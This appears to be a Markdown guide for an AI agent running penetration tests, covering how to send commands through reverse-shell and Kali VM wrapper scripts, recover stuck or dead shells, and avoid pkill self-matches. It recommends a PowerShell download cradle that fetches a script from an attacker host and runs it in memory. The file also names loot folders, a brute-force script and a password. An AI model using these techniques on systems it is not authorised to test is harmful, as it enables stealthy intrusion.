# Shell interaction discipline

How to drive a live shell (a reverse shell, an interactive session, the Kali VM). The tooling frames
output for you; do not re-implement framing on top of it.

## The contract

- **`bash /root/vm.sh '<cmd>'`** returns the *complete* output of that one command with the echoed
  command line already stripped. It IS the clean framing. One command per call.
- **`scripts/win-rsh.sh <eng> '<cmd>'`** (Windows PS reverse shell) and **`scripts/vm-rsh.sh <eng>
  '<cmd>'`** (nix reverse shell) provide the SAME contract for a persistent interactive tab: send one
  command, get its complete output back, framed by the shell's own prompt.

Because framing is handled, you never need to detect where output begins or ends.

## Rules

- **One command per tool call.** Read the result, then decide the next one.
- **Never emit sentinel, marker, delimiter, or nonce strings.** No `echo START`, no random IDs, no
  wrapping output in tokens, no splitting a string literal across concatenation to dodge the command
  echo. (This is the anti-pattern that cost a whole box's worth of turns once; the drivers frame
  output by the shell's own prompt, not by tokens you inject.)
- **Do not chain unrelated actions** with `;`, `&&`, or `|`. Chaining is fine only when the parts form
  one logical step (`cd C:\loot; dir`) or a pipe is the natural single command
  (`whoami /priv | findstr /i impersonate`).
- **Several related read-only enumeration commands in one call are fine**, separated by newlines, the
  way a human pastes them. Never join them with generated markers, and never mix enumeration with
  anything that changes state.
- **Shortest command that answers the question you have right now.** Do not pre-emptively collect
  context you have not been asked to use.
- **Write commands the way an operator at a keyboard would type them:** plain, readable, one thought
  at a time. Type `$env:USERNAME` / `$_` plainly - the driver escapes them for the bridge, you do not
  hand-encode. For a genuinely `$`-heavy or multi-statement script, host a readable `.ps1` and run it
  in-memory (`IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/enum.ps1')`) rather than
  cramming it onto one line - the cradle has no `$`, the script runs on-target, nothing hits disk.

## When output is empty, truncated, or missing

Do not add instrumentation to diagnose the tooling. Send a single cheap command with a known answer -
`whoami` is the standard probe - and read what comes back.

- **Expected username** -> the shell is alive; the previous empty/short output was a REAL result.
  Treat it as information and move on.
- **Nothing / times out** -> the shell is stuck: a process waiting on input, a command that never
  exits, or a dead connection. Say so plainly and stop. Do not keep sending commands into a stuck shell.
- **Something other than a username** -> another program owns the terminal (or, for a reverse shell,
  it DIED and dropped back to the ATTACKER prompt - the false-RCE trap, where `whoami` then returns
  `root`/`kali`, NOT the target). Say so; re-pop the shell rather than typing at it. `win-rsh.sh`
  detects this fallback and refuses to hand you attacker output as if it were the target.

Only re-run the original command if it was read-only. Never blindly repeat a command that creates,
deletes, writes, or changes state - probe first, then decide.

## Killing background procs over the bridge: never `pkill -f <pattern>` that matches your own command

`bash /root/vm.sh '<cmd>'` runs `<cmd>` on the VM, and the bridge's own process carries the full
command string in its argv. So `pkill -f 'http.server'` (or `pkill -f brute.sh`, `pkill -f Tokyo`)
matches the bridge itself and SIGTERMs your own call -> the tool returns exit 143 and kills nothing
you intended. This bit repeatedly on one engagement.

Kill by PID, or bracket the pattern so it cannot match the literal in your command:
```sh
# safe: [h] makes the regex match "http" but the literal "[h]ttp" in argv does NOT self-match
bash /root/vm.sh "ps -eo pid,args | awk '/[h]ttp\.server/{print \$1}' | xargs -r kill"
```
Never put an un-bracketed literal (a script name, a password like `Tokyo1010`) into the kill
pattern in the same command - it will appear in your own argv and self-match. `tmux kill-session -t
<name>` is always safe (matches by session name, not argv).
